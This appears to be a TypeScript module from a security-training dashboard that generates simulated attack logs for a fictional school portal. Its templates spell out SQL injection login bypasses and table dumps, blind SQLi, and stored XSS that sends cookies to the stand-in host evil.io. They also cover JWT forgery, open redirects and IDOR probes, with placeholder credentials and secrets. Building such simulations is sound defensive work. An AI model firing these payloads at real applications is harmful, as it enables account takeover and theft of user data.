import type { AttackType, Severity, LogEntry } from "@/types/defense";

export const uid  = () => Math.random().toString(36).slice(2, 10).toUpperCase();
export const rnd  = (a: number, b: number) => Math.floor(Math.random() * (b - a) + a);
export const fakeIp   = () => `${rnd(10,210)}.${rnd(1,254)}.${rnd(1,254)}.${rnd(1,254)}`;
export const fakePort = () => ([443, 8080, 3000, 80, 8443] as const)[rnd(0, 5)];

export const COUNTRIES   = ["CN","RU","KP","IR","IN","US","BR","DE","UA","PK"] as const;
export const USER_AGENTS = [
  "sqlmap/1.7.8#stable",
  "python-requests/2.31.0",
  "curl/7.88.1",
  "Nikto/2.1.6",
  "Burp Suite Professional/2024",
  "Mozilla/5.0 (custom scanner)",
] as const;

type AttackTemplate = Omit<LogEntry, "id"|"ts"|"ip"|"port"|"country"|"userAgent"|"patched"|"detected">;

export const ATTACK_TEMPLATES: AttackTemplate[] = [
  // ── SQLi — Login ────────────────────────────────────────────────────────────
  {
    type: "sqli_login", severity: "critical",
    user: "SQLSlayer99",
    detail: "Auth bypass — admin account accessed via MySQL comment injection",
    endpoint: "/api/auth/login", method: "POST", statusCode: 200,
    payload: "username=admin'-- &password=anything",
  },
  {
    type: "sqli_login", severity: "critical",
    user: "b00lean_pwn",
    detail: "Auth bypass — boolean tautology: ' OR 1=1-- logged in as first DB user",
    endpoint: "/api/auth/login", method: "POST", statusCode: 200,
    payload: "username=' OR 1=1-- &password=x",
  },
  {
    type: "sqli_login", severity: "critical",
    user: "or_master_x",
    detail: "Auth bypass via OR tautology — session cookie issued for admin account",
    endpoint: "/api/auth/login", method: "POST", statusCode: 200,
    payload: "username=' OR '1'='1'-- &password=doesntmatter",
  },

  // ── SQLi — Search ───────────────────────────────────────────────────────────
  {
    type: "sqli_search", severity: "critical",
    user: "UnionJack_h4x",
    detail: "UNION SELECT on /api/search — full users table dumped including passwords",
    endpoint: "/api/search", method: "GET", statusCode: 200,
    payload: "q=' UNION SELECT id,username,password,email,role,admission_no FROM users--",
  },
  {
    type: "sqli_search", severity: "high",
    user: "bl1nd_injector",
    detail: "Boolean blind SQLi on search — enumerating password hashes character by character",
    endpoint: "/api/search", method: "GET", statusCode: 200,
    payload: "q=' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a'--",
  },
  {
    type: "sqli_search", severity: "critical",
    user: "SchemaScout",
    detail: "Information schema dump via search — all table names extracted",
    endpoint: "/api/search", method: "GET", statusCode: 200,
    payload: "q=' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables--",
  },

  // ── SQLi — Profile URL ──────────────────────────────────────────────────────
  {
    type: "sqli_profile", severity: "critical",
    user: "URLInjector_0x",
    detail: "SQLi via profile URL param — /profile/0 UNION SELECT used to dump admin credentials",
    endpoint: "/api/profile/[id]", method: "GET", statusCode: 200,
    payload: "/profile/0 UNION SELECT username,password,email,role,full_name,admission_no FROM users LIMIT 1--",
  },
  {
    type: "sqli_profile", severity: "high",
    user: "PathMangler",
    detail: "Enumeration via profile URL — incrementing OFFSET to extract all user records",
    endpoint: "/api/profile/[id]", method: "GET", statusCode: 200,
    payload: "/profile/0 UNION SELECT username,password,email,role,full_name,admission_no FROM users LIMIT 1 OFFSET 2--",
  },

  // ── SQLi — Class filter ─────────────────────────────────────────────────────
  {
    type: "sqli_class", severity: "high",
    user: "ParamTweaker",
    detail: "SQLi via ?class= URL param — UNION SELECT injected through class filter",
    endpoint: "/search", method: "GET", statusCode: 200,
    payload: "?q=&class=' UNION SELECT username,password,NULL,NULL,NULL FROM users--",
  },

  // ── XSS — Notice board ──────────────────────────────────────────────────────
  {
    type: "xss_notices", severity: "critical",
    user: "XSSterminatorV2",
    detail: "Stored XSS in notice content — cookie exfiltration payload executed for all visitors",
    endpoint: "/api/admin/notices", method: "POST", statusCode: 200,
    payload: "content=<img src=x onerror=fetch('http://evil.io/?c='+document.cookie)>",
  },
  {
    type: "xss_notices", severity: "high",
    user: "StoredEvil_9",
    detail: "Stored XSS in notice author field — script tag executing on every page load",
    endpoint: "/api/admin/notices", method: "POST", statusCode: 200,
    payload: "author=<script>alert(document.cookie)</script>",
  },

  // ── XSS — Dashboard widget ──────────────────────────────────────────────────
  {
    type: "xss_dashboard", severity: "critical",
    user: "DashPoison_x",
    detail: "Stored XSS via notice title — executes on dashboard for every student login",
    endpoint: "/api/admin/notices", method: "POST", statusCode: 200,
    payload: "title=<img src=x onerror=document.location='http://evil.io/?c='+document.cookie>",
  },

  // ── XSS — Profile name ──────────────────────────────────────────────────────
  {
    type: "xss_profile", severity: "high",
    user: "RegistryPoison",
    detail: "Stored XSS via full_name at registration — fires for anyone viewing the profile page",
    endpoint: "/api/auth/register", method: "POST", statusCode: 200,
    payload: "full_name=<img src=x onerror=alert(document.cookie)>",
  },

  // ── XSS — Search reflected ──────────────────────────────────────────────────
  {
    type: "xss_search", severity: "high",
    user: "ReflectedEvil",
    detail: "Reflected XSS via ?q= param — payload rendered into DOM via dangerouslySetInnerHTML",
    endpoint: "/search", method: "GET", statusCode: 200,
    payload: "?q=<img src=x onerror=alert(document.cookie)>",
  },

  // ── XSS — DOM / hash ────────────────────────────────────────────────────────
  {
    type: "xss_dom", severity: "high",
    user: "HashBanger",
    detail: "DOM-based XSS via URL hash — innerHTML set from window.location.hash, fires on page load",
    endpoint: "/notices", method: "GET", statusCode: 200,
    payload: "/notices#<img src=x onerror=alert(document.cookie)>",
  },

  // ── XSS — Login error ───────────────────────────────────────────────────────
  {
    type: "xss_login", severity: "medium",
    user: "LoginReflect",
    detail: "Reflected XSS via login error message — username echoed unsafely into error DOM",
    endpoint: "/login", method: "POST", statusCode: 401,
    payload: "username=<img src=x onerror=alert(document.cookie)>&password=wrong",
  },

  // ── JWT Forgery ─────────────────────────────────────────────────────────────
  {
    type: "jwt_forge", severity: "critical",
    user: "0xDarkRoot",
    detail: "JWT weak secret brute-forced — role escalated to admin, signed with 'greenfield_jwt_s3cr3t_2025'",
    endpoint: "/admin", method: "GET", statusCode: 200,
    payload: '{alg:HS256}.{username:"0xDarkRoot",role:"admin",id:5}.<valid-sig>',
  },
  {
    type: "jwt_forge", severity: "critical",
    user: "GhostProtocol_7",
    detail: "JWT alg:none attack — signature stripped, role set to admin, token accepted by server",
    endpoint: "/api/auth/verify", method: "GET", statusCode: 200,
    payload: '{alg:"none"}.{username:"ghost",role:"admin"}. [empty signature]',
  },

  // ── IDOR — Profile ──────────────────────────────────────────────────────────
  {
    type: "idor_profile", severity: "high",
    user: "AccessAll_Area",
    detail: "IDOR: Student accessed teacher profile /api/profile/2 — email and role exposed",
    endpoint: "/api/profile/2", method: "GET", statusCode: 200,
    payload: "GET /api/profile/2  (authenticated as student id=7, not id=2)",
  },
  {
    type: "idor_profile", severity: "high",
    user: "IDsequencer",
    detail: "IDOR enumeration: incrementing profile IDs 1–20 to map all user accounts",
    endpoint: "/api/profile/[id]", method: "GET", statusCode: 200,
    payload: "Sequential requests: /api/profile/1, /2, /3 ... /20",
  },

  // ── Open Redirect ───────────────────────────────────────────────────────────
  {
    type: "open_redirect", severity: "medium",
    user: "PhishKing_x",
    detail: "Open redirect exploited — login with ?next=https://evil.io redirects victim post-auth",
    endpoint: "/login", method: "GET", statusCode: 302,
    payload: "/login?next=https://evil.io/fake-campuscare",
  },

  // ── Session Fixation ────────────────────────────────────────────────────────
  {
    type: "session_fixation", severity: "high",
    user: "GhostSession",
    detail: "Session token valid post-logout — JWT copied before logout, replayed 4 hours later",
    endpoint: "/dashboard", method: "GET", statusCode: 200,
    payload: "Cookie: token=<old-jwt-copied-before-logout>  (account: priya.sharma)",
  },

  // ── Recon ───────────────────────────────────────────────────────────────────
  {
    type: "recon", severity: "medium",
    user: "ReconBot_01",
    detail: "Sensitive data: /api/env-file returned .env contents including DB_PASSWORD and JWT_SECRET",
    endpoint: "/api/env-file", method: "GET", statusCode: 200,
    payload: "GET /api/env-file  →  JWT_SECRET=greenfield_jwt_s3cr3t_2025, DB_PASSWORD=campus_db_sup3rsecret",
  },
  {
    type: "recon", severity: "low",
    user: "SourceReader",
    detail: "Sensitive HTML comment found in /grades — admin credentials and override endpoint exposed",
    endpoint: "/grades", method: "GET", statusCode: 200,
    payload: "<!-- Password: Admin@Campus2025! Override: /admin?override=true -->",
  },
  {
    type: "recon", severity: "medium",
    user: "BackupHunter",
    detail: "Default credentials on /backup-admin — admin/backup123 accepted, backup archive path leaked",
    endpoint: "/backup-admin", method: "GET", statusCode: 200,
    payload: "POST /backup-admin  username=admin  password=backup123  →  200 OK",
  },
];
